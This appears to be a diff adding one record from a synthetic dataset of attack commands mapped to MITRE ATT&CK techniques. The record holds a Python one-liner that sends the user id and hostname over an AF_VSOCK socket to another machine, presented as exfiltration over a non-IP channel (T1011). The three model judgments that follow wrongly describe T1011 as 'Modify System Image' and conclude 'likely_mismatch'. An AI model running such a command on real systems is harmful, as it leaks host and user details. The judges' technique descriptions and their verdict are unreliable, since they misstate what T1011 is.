@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os,platform; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((4, 53211)); payload=('uid='+str(os.getuid())+' host='+platform.node()+'\\n').encode(); s.sendall(payload); s.close()\"",
+  "explanation": "Transmits minimal host and user identifiers via AF_VSOCK to CID 4 on a high, uncommon port, avoiding IP-based channels per T1011.",
+  "rationale_steps": [
+    "Pick vsock to traverse a non-IP transport medium.",
+    "Connect to CID 4 using an uncommon port (53211).",
+    "Prepare a compact identification payload and send.",
+    "Close the socket to end the exchange quickly."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-aa9e2bae",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced quotes, parentheses, and proper syntax for importing modules, creating a socket, setting parameters, and sending data.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically valid Python code that transmits system information via a VSOCK socket, it doesn't align with T1011 (Modify System Image) as it doesn't modify firmware, OS images, or bootloaders - it merely exfiltrates basic system information.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T17:10:38.086040Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced syntax, valid flag usage for `python3 -c`, and no apparent errors.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs information exfiltration via VSOCK, which is unrelated to the T1011 'Modify System Image' technique; T1011 focuses on altering OS/firmware images, not data transmission.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T17:10:51.666990Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes/parentheses, valid socket usage, and proper statement separators.",
+        "semantic_score": 0,
+        "semantic_justification": "The command merely sends minimal host/user data over AF_VSOCK and does not modify any system image, firmware, or boot process as described by the technique.",
+        "combined_score": 2.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T17:11:08.592953Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
